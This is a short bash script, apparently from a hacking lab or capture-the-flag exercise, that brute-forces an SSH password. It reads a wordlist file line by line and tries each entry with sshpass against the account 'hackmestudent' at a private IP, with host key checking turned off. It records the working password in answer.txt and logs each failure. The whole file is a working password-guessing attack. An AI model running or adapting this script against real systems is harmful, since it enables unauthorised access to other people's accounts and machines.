#!/bin/bash

text=$1
#echo "$text"

path=$(pwd)
#echo "$path"
path="$path/$text"
echo "$path"

true > log.txt
 
while read line;
do
  
  sshpass -p $line ssh -o StrictHostKeyChecking=no hackmestudent@10.8.37.93 exit
  if [ $? -eq 0 ]
  then
     echo "$line is it" > answer.txt
  else
     echo "$line is not it" >> log.txt
  fi
  echo $line
done < $path
